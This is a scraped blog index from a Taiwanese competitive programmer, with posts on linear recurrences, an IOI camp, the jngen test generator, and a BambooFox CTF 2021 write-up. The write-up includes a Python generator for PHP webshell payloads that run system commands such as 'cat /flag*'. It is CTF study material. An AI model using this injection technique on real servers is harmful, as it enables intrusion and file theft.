給定一個稀疏矩陣$A$想求$\\det(A)$。事實上只要求得特徵方程式的常數項就可以得到行列式。\n根據 wiki 上 Cayley Hamilton 定理的頁面，最小多項式是特徵多項式的因式，但他們可能不相等，不過他們的根集合是相同的，問題只是特徵多項式裡可能有重根。因此我們把$A$乘上一個隨機的對角矩陣$B$，可以證明$AB$沒有重根（特徵多項式與最小多項式相等）的機率至少是 $1 - \\frac{2n^2 - n}{p}$。似乎同樣又是Schwartz-Zippel。\n總之，求得 $AB$ 的特徵多項式 $p$ ，並設 $p$ 的領導係數是 $1$ （如果不是就除掉），那麼 $\\det(AB)$ 就是 $(-1)^{|A|} \\cdot p(0)$ 也就是 $p$ 的常數項差一個正負號。 $\\det(A) = \\det(AB) / \\det(B)$ 就完成了。\n這個是之前打BambooFoxCTF google and copy過別人的XD現在才來完整了解作法\nReference https://codeforces.com/blog/entry/61306\nhttps://www.cnblogs.com/zzqsblog/p/6877339.html\nhttps://github.com/enkerewpo/OI-Public-Library/blob/master/IOI%E4%B8%AD%E5%9B%BD%E5%9B%BD%E5%AE%B6%E5%80%99%E9%80%89%E9%98%9F%E8%AE%BA%E6%96%871999-2019/%E5%9B%BD%E5%AE%B6%E9%9B%86%E8%AE%AD%E9%98%9F2019%E8%AE%BA%E6%96%87%E9%9B%86.pdf\n註：我遞迴、遞推等等用詞都搞不太清楚，不過我猜不重要吧XD\n越來越毒的感覺了，該把路矯正回來喇ww\n不知道會有多少人仔細看？抓typo不要鞭太用力QQ\n","permalink":"https://omeletwithoutegg.github.io/2021/02/13/linear-recurrence/","tags":["template","math"],"title":"線性遞迴淺淺談"},{"contents":"IOIC 2021 去年就來過一次了，今年再次造訪這困難的營隊。\n其實幾乎沒有什麼特別不一樣的地方，不過我想說還是寫個短短的紀錄。\n吃的東西 IOIC有準備早餐、午餐跟晚餐讓我們不用擔心時間太可怕的問題（？）\n然後還有下午的點心，大致上都不錯吃，除了有魚刺的便當QQ\n可惜的是去年會在吃東西的時候放影片，今年可能是因為疫情怕我們吵雜起來，甚至還讓我們坐梅花座。\n上課 這次上課的主題和去年比較起來，好像少了常數優化、隨機、分塊之類的，但是多了flow跟game theory。\n老實說很多東西都是聽過但是不那麼熟QQ\n喵喵時間不知道選訓有沒有機會再聽到一次(X\n而且講義幾乎都是「參考」前幾年的（雖然本來就應該要這樣，滾動式稍微有更新就好）\n這次覺得比較有聽到的應該是burnside lemma跟flow還有賽局的東東。雖然賽局的題目好像都跟上課沒什麼關係QQ只要會mex跟xor和通靈（重要）就好。\n模擬賽 第一天趣味賽還可以，賽到一個隨機bubble sort的debug題\n接下來兩天天都爆炸，真的是實力檢討大會QQ\n第四天個人賽其實還不錯，但是就輸balbit，最後忙著猜pA來不及想I或是H QQ通靈難死\n第五天，放鬆打（？）反正好幾個人都在我們上面習慣了。\n這種長時間的比賽幾乎大家的開題都差不多，然後我很習慣用subtask來確認有沒有寫錯，只有整題的feedback超難@@\n最後差一點用題數贏，不過輸在就是輸在DP沒有想好QQ\n發獎品的時候拿到的是除蟲網（？）是不是要成為AY傳人了(#\n賽後補題 基本上快把全部的題目都補完了，剩下兩題吧（？）\n在IOIC的judge搶topcoder好好玩，尤其是在用毒瘤演算法的時候XD\n老實說上課幾乎都在刷題或是補題，我覺得這樣也許有點糟糕，不過我相信補題也是一種收穫。\n","permalink":"https://omeletwithoutegg.github.io/2021/02/06/IOICamp-2021/","tags":["experience","IOIC"],"title":"IOICAMP 2021"},{"contents":"jngen 最近在生107北市賽題目的測資想放到TIOJ上面，其中一題是關於找兩個凸包的兩條內公切線交點。\n因為不太知道測資怎麼生，又想到之前東東有提過jngen這個東西，因此就把他拿來生成我需要的凸包了。\n我覺得他的函式、方法都很乾淨，然後因為生測資仔細看了一下文件，就想說把他貼到部落格推廣一下（X\nUsage https://github.com/ifsmirnov/jngen\n要使用jngen，你只需要下載jngen.h並引用標頭檔。下載來的標頭檔可以放在 /usr/include 之類的地方，或是跟你的C++原始碼相同目錄當中。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #include \u0026#34;jngen.h\u0026#34; #include \u0026lt;iostream\u0026gt; using std::cout, std::endl; int main(int argc, char *argv[]) { registerGen(argc, argv); parseArgs(argc, argv); int n, m; getPositional(n, m); Tree t = Tree::bamboo(n).link(n - 1, Tree::star(m), 0); if (getOpt(\u0026#34;shuffled\u0026#34;, false)) { t.shuffle(); } cout \u0026lt;\u0026lt; t.printN().add1() \u0026lt;\u0026lt; endl; } 下面只會挑這次有用到的主題帶過一些函數，我這次完全沒用到字串、圖論、數學的函式庫。\nRandom jngen跟testlib一樣會使用你執行時傳入的參數做一些hash之類的當作偽隨機的種子，所以如果不是每次呼叫main都用不同參數呼叫，就得乾脆把一個種子在一個generator裡面重複利用。\n記得在main裡面呼叫registerGen(argc, argv)。\nrnd rnd是一個全域物件，可以呼叫rnd.next(l, r)之類的方法來取得隨機數字。這些方法大部分跟testlib相容。\nrnd.next(int n) 生成 $[0, n)$ 的隨機數字 rnd.next(int l, int r) 生成$[l, r]$的隨機數字 rnd.nextf() 生成$[0, 1)$的隨機浮點數 rnd.wnext(int n, int w)、rnd.wnext(int l, int r, int w) 在$w \u0026gt; 0$的時候會取$w$次隨機的結果取$\\max$，在$w \u0026lt; 0$的時候則是取$\\min$。 rnd.nextp(int n, [RandomPairTraits])、\nrnd.nextp(int l, int r, [RandomPairTraits]) 回傳一個pair，兩個數字都介在範圍之內。RandomPairTraits是可選參數，像是 opair: ordered pair，保證first \u0026lt;= second dpair: distinct pair，保證first != second odpair, dopair: 保證first \u0026lt; second Option 跟testlib一樣，他也提供了command-line執行參數的parser。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // ./main 10 -pi=3.14 20 -hw hello-world randomseedstring int main(int argc, char *argv[]) { parseArgs(argc, argv); int n, m; double pi; string hw; n = getOpt(0); // n = 10 pi = getOpt(\u0026#34;pi\u0026#34;); // pi = 3.14 n = getOpt(5, 100); // n = 100 as there is no option #5 pi = getOpt(\u0026#34;PI\u0026#34;, 3.1415); // pi = 3.1415 as there is no option \u0026#34;PI\u0026#34; getPositional(n, m); // n = 10, m = 20 getNamed(hw, pi); // hw = \u0026#34;hello-world\u0026#34;, pi = 3.14 cout \u0026lt;\u0026lt; (int)getOpt(\u0026#34;none\u0026#34;, 10) \u0026lt;\u0026lt; endl; // 10 as there is no \u0026#34;none\u0026#34; option } 呃\u0026hellip;沒什麼好說的，一看就懂。如果出了什麼錯誤會報錯，例如找不到這個選項而且沒有預設值，或是轉型出問題。\nArray 這好嗎？這很好。\nArray是包裝過後的std::vector，重載了輸入輸出的運算子，讓我們不再需要重複撰寫 cout \u0026lt;\u0026lt; a[i] \u0026lt;\u0026lt; \u0026quot; \\n\u0026quot;[i+1==n] 這種程式碼。並且，他在輸出的時候可以簡單的增加選項，例如印出陣列長度或是shuffle、sort、reverse、unique等等，都快變成python了。\n有頗多方法，首先是生成隨機Array的方法。\nArray::id(size_t n)和iota類似回傳依序包含0~n-1的Array。 Array::random(size_t n, Args ...args)回傳每個元素各自以rnd用args參數隨機生成的一個Array。 Array::randomUnique(size_t n, Args ...args) 和前者類似，但回傳元素完全不相異的Array。注意如果生成失敗會throw錯誤。 Array::randomf(size_t n, Func func, Args ...args)回傳每個元素各自以func用args參數生成的一個Array。 接著是型別為Array的變數或是暫時變數後面可以加的一些方法，有點像是形容詞之類的，作者叫output modifier（？）\n以下假設該變數叫a\na.shuffle()、a.shuffled() 前者shuffle自己並回傳reference，後者回傳一個shuffle過的物件。 a.sort()、a.sorted()、 a.unique()、a.uniqued()、 a.reverse()、a.reversed() 可以類推。 a.inverse() 回傳一個排列的inverse。如果該陣列不是一個排列會throw錯誤。 a.choice()、a.choice(size_t count) 隨機取出一個或 count 個元素。 a.printN() 印出陣列大小。 a.add1() 把陣列內容+1，在0-base轉1-base有用。 a.endl() 原本每項之間是以空白分隔改為以換行分隔。 還有用+、+=可以串接Array，*、*=會重複原本的內容數次，跟python的list有點像。\n此外，一樣可以存取begin、end然後用想要的STL做事情。\n1 2 3 4 5 void gen(int n, int c) { auto p = Array::id(n).shuffled(); auto a = Array::random(n, c); cout \u0026lt;\u0026lt; p.printN() \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39; \u0026lt;\u0026lt; a \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } Geometry rndg也是一個全域物件，提供生成幾何物件的方法。\n主要分成三大類函數：生成一個隨機點、生成一個隨機凸多邊形、生成$n$個三點不共線的點\nrndg.point(long long C)、\nrndg.point(long long min, long long max)、\nrndg.point(long long x1, long long y1, long long x2, long long y2) 回傳範圍內隨機的一個整數點，型別是Point。\nrndg.pointf 跟 rndg.point 類似但回傳浮點數型態的。\nPoint 型別可以做加減法、內外積（*跟%運算子）、純量積、字典序比大小、比較是否等於\nrndg.convexPolygon(int n, long long C)、\nrndg.convexPolygon(int n, long long min, long long max)、\nrndg.convexPolygon(int n, long long x1, long long y1, long long x2, long long y2) 回傳每個點都在範圍內的整數點隨機多邊形。型別是Polygon。\nPolygon基本上是繼承一個Point的Array，並且有shift(), shifted()方法可以平移整個多邊形，或是reflect(), reflected()方法對原點鏡射。\nrndg.pointsInGeneralPosition(int n, long long C)、\nrndg.pointsInGeneralPosition(int n, long long min, long long max)、\nrndg.pointsInGeneralPosition(int n, long long x1, long long y1, long long x2, long long y2) 回傳$n$個點使得沒有任兩點相同且任三點不共線。複雜度$\\mathcal{O}(n^2\\log n)$。型別是TArray\u0026lt;Point\u0026gt;\nDrawer 拿來畫svg檔案的。沒有一個全域物件，必須自己宣告Drawer d。\nd.point() 畫點。可以填Point物件，pair或是兩個int d.circle() 畫圓，最後一個參數是半徑。可以填Point物件，pair或是兩個int d.segment() 畫線段。可以填兩個Point、兩個pair或是四個int d.polygon() 畫多邊形。注意他只是連續的線段，所以順序要自己弄好。可以傳Polygon物件，vector\u0026lt;Point\u0026gt;，vector\u0026lt;pair\u0026gt;等等 d.dumpSvg(\u0026quot;image.svg\u0026quot;) 把這個畫布上面的東西存到image.svg裡面 感想 引用別人的模板真的讓自己的程式碼乾淨很多\n像是整理成這樣就感覺到一種先進感，也感覺終於稍微活用shell script。\n之前原本是用shell script管理整個生測資的流程，後來覺得既然要寫for迴圈為什麼不乾脆放在C++裡面，就搞得像是把C++當成腳本語言在寫。現在這樣分成好幾個資料夾並且用script管理他們的編譯、執行感覺就乾淨多多！\n本來是想說這根本完美懶人出題標頭檔吧？\n後來出到最後一題才發現有些應該要有東西還是得自己寫QQ\n像是隨機的二維陣列吧，或是zip兩個陣列之後變成pair的陣列吧，這些功能都沒有qwq\n（更新：隨機的二維陣列其實有很乾淨的寫法）\n1 2 // generates n*m 2d array Array2d a = Array2d::randomf(n, [\u0026amp;](){ return Array::random(m, maxc); }); 寫這篇的時候又再查了怎麼生成凸包，發現stackoverflow有一個更正道的作法而不是jngen這樣用橢圓唬爛（？）不過都不知道他們生成的效果怎麼樣，反正我猜北市賽測資不會好到哪裡去啦XD\n這篇其實沒有很完整，畢竟他的feature很多，要把整篇document翻完等有空再說吧www而且作者似乎也停更ㄌQQ\n","permalink":"https://omeletwithoutegg.github.io/2021/01/24/jngen/","tags":["template","experience","cpp"],"title":"jngen"},{"contents":"BambooFox CTF 2021 這次是第二次參加BambooFox，不過事前都沒有做什麼練習wwww本來想說去OT之前推薦過的網站練習一些基礎，但是忘記是什麼網站了888\n依然是跟joy一隊，然後另一個隊友變成casper了\n今年似乎是大進步，不過我懷疑只是因為考很多演算法題orz\n來講一些有解的題目，很抱歉我不知道怎麼讓我的code折疊起來XD\nGamer\u0026rsquo;s Cipher 一開場先開了 P versus ♯P，雖然查到解法可是精度跟速度都壓不過去，所以只好放棄改開別題。\n然後第一個成功的題目就是Gamer\u0026rsquo;s Cipher這一題。\ncasper說看懂code就解完了（？）不過他沒辦法編譯所以也不知道怎麼辦。\n總之我也跑去下載code看，然後查了好一下子怎麼編譯Haskell（記得編譯要加-dynamic的flag），成功編譯之後努力看懂code。\n看起來像是用Nimber對字串加密，\n明文和密文的長度都是$n=51$，然後他的key必須要是$n$階的原根，所以我寫了一個腳本看哪些是合法的key。\n1 2 3 4 5 6 7 8 #!/bin/bash # search possible keys len=51 printf \u0026#34;len = %d\\n\u0026#34; $len for i in $(seq 0 255); do echo $i printf \u0026#34;%51s\\n%d\\n\u0026#34; \u0026#39;\u0026#39; $i | tr \u0026#34; \u0026#34; \u0026#34;a\u0026#34; | ./Main 2\u0026gt;/dev/null \u0026gt;/dev/null \u0026amp;\u0026amp; printf \u0026#34;i = %d\\n\\n\u0026#34; $i \u0026gt;\u0026gt; possible.txt done 但是關鍵的加密部份怎麼樣都不確定我看的對不對，所以我先把nimber的乘法表弄成一個文字檔存起來，再另外寫一個python跟Haskell的輸出比對\n整理一下之後發現，欸這個式子不就是傅立葉轉換嗎？！（而且還是用Nimber做DFT，酷爆）就想說可能要用多項式插值或是寫inverse FFT\n之後用python寫inverse DFT寫掉了，基本上只要把key的乘法反元素找出來帶進去傅立葉轉換的式子就好了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 #!/bin/bash # build multipication table # Main.hs: # main :: IO () # main = do # a \u0026lt;- readNim # b \u0026lt;- readNim # print (a * b) # cat /dev/null \u0026gt; multable.txt for i in $(seq 0 255); do echo $i for j in $(seq 0 255); do printf \u0026#34;%d\\n%d\\n\u0026#34; $i $j | ./Main \u0026gt;\u0026gt; multable.txt done done 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 A = [[0 for j in range(256)] for i in range(256)] with open(\u0026#39;multable.txt\u0026#39;, \u0026#39;r\u0026#39;) as f: f.readline() for i in range(256): for j in range(256): A[i][j] = int(f.readline()) # print(A) def div(a, b): for i in range(256): if A[i][b] == a: return i return -1 def mul(a, b): return A[a][b] def add(a, b): return a ^ b def power(val, n): # binpow? res = 1 for i in range(n): res = mul(res, val) return res # print(\u0026#34;div(1, 65) = \u0026#34;, div(1, 65)) # print(\u0026#34;div(1, 51) = \u0026#34;, div(1, 51)) def encrypt(message, key): n = len(message) pows = lambda val: [power(val, i) for i in range(n)] keys = pows(key) coef = [mul(message[i], keys[i]) for i in range(n)][::-1] res = [0 for i in range(n)] for i in range(n): s = 0 pv = pows(keys[i]) for j in range(n): s = add(s, mul(coef[j], pv[j])) res[i] = add(keys[i], s) print(coef) # print(res) return res def decrypt(res, key): n = len(res) pows = lambda val: [power(val, i) for i in range(n)] keys = pows(key) # coef = [mul(message[i], keys[i]) for i in range(n)][::-1] coef = [0 for i in range(n)]; for i in range(n): pv = pows(keys[n-i if i \u0026gt; 0 else 0]) s = 0 for j in range(n): s = add(s, mul(add(res[j], keys[j]), pv[j])) coef[i] = s # print(coef) message = \u0026#39;\u0026#39; for i in range(n): message += chr(div(coef[n-1-i], keys[i])) print(message) # t = encrypt([i for i in range(51)], 65) # decrypt(t, 65) # exit() sec = [13,1,114,230,244,145,218,78,204,36,81,48,148,35,40,50,78,40,88,43,122,39,41,149,208,208,191,68,65,61,224,140,18,239,104,210,110,119,178,27,173,253,15,237,85,192,82,74,148,15,250] # res = encrypt([ord(c) for c in input()], int(input())) ks = [102, 122, 125, 132, 140, 147, 150, 154, 159, 166, 172, 176, 180, 187, 191, 195, 196, 200, 207, 213, 216, 225, 239, 242, 244, 251, 253, 65, 69, 83, 86, 96] for k in ks: decrypt(sec, k) Better than ASM 這時候joy似乎在看交替看各題，casper在解verilog\n然後我發現calc.exe有給source code很佛 :D 雖然是放在網頁隱藏的元素上面，不過點進去html就看得到了。但是不太知道要幹嘛。\n只好交替看各題，看了reverse最後面這題給的檔案，把副檔名拿去google發現似乎是LLVM，而且跟wiki上面LLVM的中間語言，Intermediate Representation格式應該是吻合的。\n執行lli task.ll可以執行這個bitcode，但是他就只是個會問你答不出來的問題的小壞蛋\n畢竟我不會看這種很像組語的東西，所以就找一下有沒有轉換的工具，還真的在github上看到有llvm2c這個工具可以轉換成C語言，我還不star爆 XDD\n換成C語言之後發現超多goto，不過其實都只是if跟for迴圈產生的goto而已，沒有特別混淆的感覺。\n倒是變數用的超級多，大概是因為組語會把強制轉型跟那些暫時變數寫出來吧（例如算(i+1)%n就會int var3 = i+1; var3 % n或是複製一遍同樣的數字只是因為要轉unsigned）\n總之他做的是只是input -\u0026gt; validate -\u0026gt; win/fail，他的win會要用到input的字串然後做一些加密還是hash的動作，而validate只是檢查input的兩兩相鄰字元是否跟某個常數陣列相符，所以我枚舉第一個字元就能得知整個字串，接著call win看輸出就可以找到flag了。老實說我一開始還以為做錯了，因為要從幾十個亂碼裡面找出合理的輸出比想像中難，何況他的flag還是用Leetspeak寫出來的XD怎麼找到的我都不知道。\n下面是我最後化簡的code，全域的陣列大部份刪掉以便閱讀，可以看到main裡面還留了一些goto，基本上就只是在做for迴圈而已\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; // function declarations // extern unsigned int __isoc99_scanf(unsigned char* var0, ...); unsigned int check(unsigned char* var0); int main(void); // extern unsigned int printf(unsigned char* var0, ...); // extern unsigned long strlen(unsigned char* var0); // global variable definitions unsigned char format[64] = { ... }; unsigned char flag[64] = { ... }; unsigned char what[64] = { ... }; unsigned char secret[64] = { ... }; unsigned char _str[49] = { ... }; unsigned char _str_1[25] = { ... }; unsigned char _str_2[7] = { ... }; unsigned char _str_3[5] = { ... }; unsigned char _str_4[81] = { ... }; unsigned int check(unsigned char* str){ unsigned int i; for(i = 0; i \u0026lt; strlen(what); i++) { int a = str[i], b = str[(i+1)%strlen(what)]; if((a ^ b) != ((int)(what[i]))) return 0; } return 1; } unsigned char str[64]; void solve(char c) { unsigned int i, n = strlen(what); str[0] = c; for(i = 0; i+1 \u0026lt; n; i++) { str[i+1] = str[i] ^ what[i]; } str[n] = 0; // printf(\u0026#34;%c\\n%c\\n\u0026#34;, str[n-2], str[n-1]); // puts(str); // printf(\u0026#34;%u\\n\u0026#34;, strlen(str)); } int answer(unsigned char var1[]) { unsigned int var2; unsigned int var3; unsigned long var4; long var5; int var6; long var7; long var8; int var9; long var10; // printf(\u0026amp;(_str[0])); // printf(\u0026amp;(_str_1[0])); // printf(\u0026amp;(_str_2[0])); // puts(what); // scanf(\u0026amp;(_str_3[0]), \u0026amp;(var1[0])); var4 = strlen(\u0026amp;(var1[0])); // printf(\u0026#34;input = %s\\n\u0026#34;, var1); // printf(\u0026#34;var4 = %d\\n\u0026#34;, (int)var4); // printf(\u0026#34;strlen(what) = %d\\n\u0026#34;, (int)strlen(what)); if (var4 != strlen(\u0026amp;(what[0]))) { return 1; printf(\u0026amp;(_str_4[0])); return 1; } else { if (check(\u0026amp;(var1[0])) != 0) { // printf(\u0026#34;Here!\\n\u0026#34;); var2 = 0; goto block4; // here is for loop block4: var5 = ((long)var2); if (((unsigned long)var5) \u0026lt; strlen(\u0026amp;(var1[0]))) { var6 = ((int)(var1[(long)var2])); var7 = ((long)var2); (var1[(long)var2]) = ((unsigned char)(var6 ^ ((int)(secret[((unsigned long)var7) % strlen(\u0026amp;(secret[0]))])))); var2 = (((int)var2) + ((int)1)); goto block4; } else { printf(\u0026#34;output = %s\\n\\n\u0026#34;, var1); // printf(\u0026amp;(format[0]), \u0026amp;(var1[0])); return 0; } } else { return 3; var3 = 0; goto block9; // here is for loop block9: var8 = ((long)var3); if (((unsigned long)var8) \u0026lt; strlen(\u0026amp;(var1[0]))) { var9 = ((int)(flag[(long)var3])); var10 = ((long)var3); (var1[(long)var3]) = ((unsigned char)(var9 ^ ((int)(secret[((unsigned long)var10) % strlen(\u0026amp;(secret[0]))])))); var3 = (((int)var3) + ((int)1)); goto block9; } else { printf(\u0026amp;(format[0]), \u0026amp;(var1[0])); return 0; } } } } int main(void) { for(int i = 0; i \u0026lt; 128; i++) { solve(i); answer(str); } } Calc.exe online 不久之後casper把verilog(flag checker)給做出來了\n我也弄出來說sin[0]會跑出s這個字串（不記得是google還是試出來的了）\n然後Google發現大概是webshell這個主題，接著又找到可以用('system')()之類的方法執行函數，我就照著找到的東西試試看('phpinfo')()，\n然後真的跑出東西了XD\n但是我很多字元弄不出來，後來查到可以用chr這個函數，就能成功湊出所有的字元啦！\n不過我不知道flag在哪裡，所以執行了('system')('find / -name \u0026quot;flag*')找到flag在哪裡，最後執行了('system')('cat /flag*')得到flag的內容\n下面是我最後拿來湊出字元的腳本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 good = [\u0026#39;abs\u0026#39;, \u0026#39;acos\u0026#39;, \u0026#39;acosh\u0026#39;, \u0026#39;asin\u0026#39;, \u0026#39;asinh\u0026#39;, \u0026#39;atan2\u0026#39;, \u0026#39;atan\u0026#39;, \u0026#39;atanh\u0026#39;, \u0026#39;base_convert\u0026#39;, \u0026#39;bindec\u0026#39;, \u0026#39;ceil\u0026#39;, \u0026#39;cos\u0026#39;, \u0026#39;cosh\u0026#39;, \u0026#39;decbin\u0026#39;, \u0026#39;dechex\u0026#39;, \u0026#39;decoct\u0026#39;, \u0026#39;deg2rad\u0026#39;, \u0026#39;exp\u0026#39;, \u0026#39;floor\u0026#39;, \u0026#39;fmod\u0026#39;, \u0026#39;getrandmax\u0026#39;, \u0026#39;hexdec\u0026#39;, \u0026#39;hypot\u0026#39;, \u0026#39;is_finite\u0026#39;, \u0026#39;is_infinite\u0026#39;, \u0026#39;is_nan\u0026#39;, \u0026#39;lcg_value\u0026#39;, \u0026#39;log10\u0026#39;, \u0026#39;log\u0026#39;, \u0026#39;max\u0026#39;, \u0026#39;min\u0026#39;, \u0026#39;mt_getrandmax\u0026#39;, \u0026#39;mt_rand\u0026#39;, \u0026#39;octdec\u0026#39;, \u0026#39;pi\u0026#39;, \u0026#39;pow\u0026#39;, \u0026#39;rad2deg\u0026#39;, \u0026#39;rand\u0026#39;, \u0026#39;round\u0026#39;, \u0026#39;sin\u0026#39;, \u0026#39;sinh\u0026#39;, \u0026#39;sqrt\u0026#39;, \u0026#39;srand\u0026#39;, \u0026#39;tan\u0026#39;, \u0026#39;tanh\u0026#39;, \u0026#39;ncr\u0026#39;, \u0026#39;npr\u0026#39;, \u0026#39;number_format\u0026#39;] mp = {} for s in good: for j in range(len(s)): if s[j] not in mp or len(mp[s[j]]) \u0026gt; len(s)+2+len(str(j)): mp[s[j]] = s + \u0026#39;[\u0026#39; + str(j) + \u0026#39;]\u0026#39; # print(mp) def solve(s): ret = \u0026#39;\u0026#39; first = True for c in s: if not first: ret += \u0026#39;.\u0026#39; first = False if c not in mp: ret += f\u0026#39;(({solve(\u0026#34;chr\u0026#34;)})({ord(c)}))\u0026#39; else: ret += mp[c] return ret # print(\u0026#39;(\u0026#39; + solve(\u0026#39;system\u0026#39;) + \u0026#39;)\u0026#39; + \u0026#39;(\u0026#39; + solve(\u0026#39;find / -name flag*\u0026#39;) + \u0026#39;)\u0026#39;) # call (\u0026#39;system\u0026#39;)(\u0026#39;ls\u0026#39;) print(\u0026#39;(\u0026#39; + solve(\u0026#39;system\u0026#39;) + \u0026#39;)\u0026#39; + \u0026#39;(\u0026#39; + solve(\u0026#39;cat /flag*\u0026#39;) + \u0026#39;)\u0026#39;) # call (\u0026#39;system\u0026#39;)(\u0026#39;ls\u0026#39;) # print(solve(\u0026#39;echo\u0026#39;)) # print(solve(\u0026#39;getallheaders\u0026#39;)) # print(solve(\u0026#39;system\u0026#39;)) # print(solve(\u0026#39;ls\u0026#39;)) P versus ♯P 接下來我基本上通宵都在弄這題。我覺得這題很有趣，題目是server會丟給你一個有障礙物的棋盤方格，簡單版本是問是否可以用1x2的骨牌蓋滿而困難版本是問有幾種方法。\n這個之前蕭梓宏好像講過，所以我知道他是可作的，就是平面圖的完美匹配個數。google之後找到CSDN有現成的code，先感謝owo\n不過可惜他是對998244353 mod，而且加邊的方式也有些不同，所以我稍微改了一下code，改成日月卦長的大數，不過速度真的很慢，超級慢QQ\n我猜是因為途中數字會變超大所以速度就燒雞。我找各種python的套件要高精度快速做矩陣行列式的都找不到可以用的QQ所以我最後決定用中國剩餘定理，選夠多的質數算XD\n這樣行列式還是算的頗慢，大概在12~13筆就會卡住了，於是就卡關跑去解Gamer\u0026rsquo;s Cipher和別題。\n晚上的時候想到這張圖是平面圖，因此矩陣是稀疏的，跑去github上面找了稀疏矩陣行列式，還真的有XD 真香 而且作法還是跟之前看過得中國IOI國家隊論文寫的一樣XDD\n所以就套上去，但是但是！這樣還是不夠快，時間已經到了隔天凌晨七點，我嘗試最後一次後就把檔案丟給隊友倒下去了。\n起床是十二點多，最後我是又找到另外一個github上面的 code 可以加速同餘下的乘法才終於成功把時間壓到範圍內，做出來真的成就感滿滿。\n我最後的code有點長，之後再考慮另外放好了\nRansomware The vault是web assembly，被casper解決掉。同時joy也催促（？）我解這題，雖然他已經剩下50分了QQ\n總之他給了.pyc檔跟一個flag.enc的檔案，把byte code用工具（decompyle之類的，不知道版本重不重要，不過以magic numbe來看這個.pyc似乎是3.8）轉回來.py之後就可以輕鬆知道他是把flag.png以官方網頁上面的文字當作金鑰用AES加密成flag.enc，\n用同一個套件解密後得到flag.png寫著the flag is after this image，我一頭霧水丟給joy他就直接找出真正的flagㄌ，似乎是兩張png黏在一起的梗。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 # decompyle3 version 3.3.2 # Python bytecode 3.8 (3413) # Decompiled from: Python 3.8.0 (default, Jan 17 2021, 16:18:58) # [GCC 10.2.0] # Embedded file name: task.py # Compiled at: 2021-01-14 22:13:24 # Size of source mod 2**32: 420 bytes from Crypto.Cipher import AES # def func(key, iv, data, AES): # open(\u0026#39;flag.enc\u0026#39;, \u0026#39;wb\u0026#39;).write(AES.new(key, AES.MODE_CBC, iv).encrypt(lambda x: x + b\u0026#39;\\x00\u0026#39; * (16 - len(x) % 16)(data))) def decrpt(key, iv, AES): cipher = AES.new(key, AES.MODE_CBC, iv) raw = open(\u0026#39;flag.enc\u0026#39;, \u0026#39;rb\u0026#39;).read() print(len(raw)) open(\u0026#39;flag.png\u0026#39;, \u0026#39;wb\u0026#39;).write(cipher.decrypt(raw)) data = __import__(\u0026#39;requests\u0026#39;).get(\u0026#39;https://ctf.bamboofox.tw/rules\u0026#39;).text.encode() key = 99 iv = 153 # func(data[key:key + 16], data[iv:iv + 16], open(\u0026#39;flag.png\u0026#39;, \u0026#39;rb\u0026#39;).read(), __import__(\u0026#39;Crypto.Cipher.AES\u0026#39;).Cipher.AES) if len(data) != 0 else lambda fn: __import__(\u0026#39;os\u0026#39;).remove(fn)(\u0026#39;task.py\u0026#39;)) decrpt(data[key:key+16], data[iv:iv+16], AES) # okay decompiling task.pyc orz Network 被casper丟了這題，他說這是質數什麼的題目應該交給我\n看起來像是隨便找一棵生成樹然後把每條邊都解密就可以了，他使用的加密方法是Diffie-Hellman，去維基百科可以翻到公鑰與私鑰各自的定義。\n總之，要求私鑰我們就必須求離散對數，但是他的數字範圍給到10^18而且有419個數字要解，很明顯不能直接大步小步做完，\n經過一番google，我發現了Pohlig-Hellman algorithm，是可以在大約sqrt(p)的量級解離散對數，其中p是mod的phi值（=mod-1）的最大質因數。因為完全沒有找到C++的code所以我自己按照維基上面的敘述刻，花了一段時間之後可以在合理的時間內解出某條邊了。\n接下來就找生成樹然後對那些邊解密就對了。這題比前面幾題的演算法題簡單多了，雖然還是套了一大堆模板XDD\n直接去抄waynedisonitau123的Pollard-Rho還有Millar-Rabin好爽喔XDDD\n然後大步小步跟中國剩餘也都不用自己寫，對打高中競程的人來說真的是夢幻待遇(X\nsolve.cpp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 #include \u0026lt;bits/extc++.h\u0026gt; using namespace std; using ll = long long; using LLL = __int128; ll modpow(ll e, ll p, ll m) { ll r = 1; while(p) { if(p \u0026amp; 1) r = (LLL)r * e % m; e = (LLL) e * e % m; p \u0026gt;\u0026gt;= 1; } return r; } ll modmul(ll a, ll b, ll m) { return (LLL) a * b % m; } struct Factorization { struct MillerRabin { // n \u0026lt; 4759123141 chk = [2, 7, 61] // n \u0026lt; 1122004669633 chk = [2, 13, 23, 1662803] // n \u0026lt; 2^64 chk = [2, 325, 9375, 28178, 450775, 9780504, 1795265022] 